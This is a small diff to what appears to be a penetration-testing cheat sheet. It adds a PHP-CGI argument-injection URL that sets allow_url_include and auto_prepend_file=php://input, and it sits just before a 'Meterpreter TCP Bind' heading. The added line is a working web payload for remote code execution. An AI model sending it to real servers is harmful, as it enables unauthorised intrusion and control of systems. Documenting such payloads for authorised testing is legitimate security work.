@@ -60,7 +60,8 @@ http://vulnerable/?-s
 
 _Exploitation:_
 ```
-Enable allow_url_include=1
+# Enable allow_url_include=1
+http://vulnerable/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input
 ```
 
 _Meterpreter TCP Bind_
